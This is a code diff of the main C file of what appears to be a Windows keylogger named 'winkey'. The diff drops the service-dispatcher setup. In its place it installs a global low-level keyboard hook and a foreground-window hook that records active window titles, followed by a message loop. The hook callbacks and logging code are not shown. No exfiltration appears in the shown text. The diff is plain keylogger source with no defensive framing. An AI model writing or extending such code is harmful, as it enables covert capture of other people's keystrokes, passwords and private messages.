@@ -1,8 +1,5 @@
 #include "winkey.h"
 
-SERVICE_STATUS svcStatus;
-SERVICE_STATUS_HANDLE svcStatusHandle;
-HANDLE svcStopEvt = NULL; 
 HHOOK winHook;
 HWND gh_hwndMain;
 BOOL foregroundWindowChanged;
@@ -17,14 +14,21 @@ int main(int argc, char **argv)
 {
     (void)argc;
     (void)argv;
-    SERVICE_TABLE_ENTRY DispatchTable[] = {
+    winHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    HWINEVENTHOOK winEvt = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
+    if (winHook == NULL || winEvt == NULL)
+        exit(PrintError());
+    foregroundWindowChanged = TRUE;
+    GetWindowTitle(GetForegroundWindow());
+    MSG msg;
+    while (1)
+    {
+        if (GetMessage(&msg, NULL, 0, 0))
         {
-            SVC_NAME, (LPSERVICE_MAIN_FUNCTION)SvcMain
-        },
-        {
-            NULL, NULL
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
         }
-    };
-    if (!StartServiceCtrlDispatcher(DispatchTable))
-        log("[Unable to connect to SCM.]\n", CHAR_MODE, TRUE);
+    }
+    UnhookWinEvent(winEvt);
+    UnhookWindowsHookEx(winHook);
 }
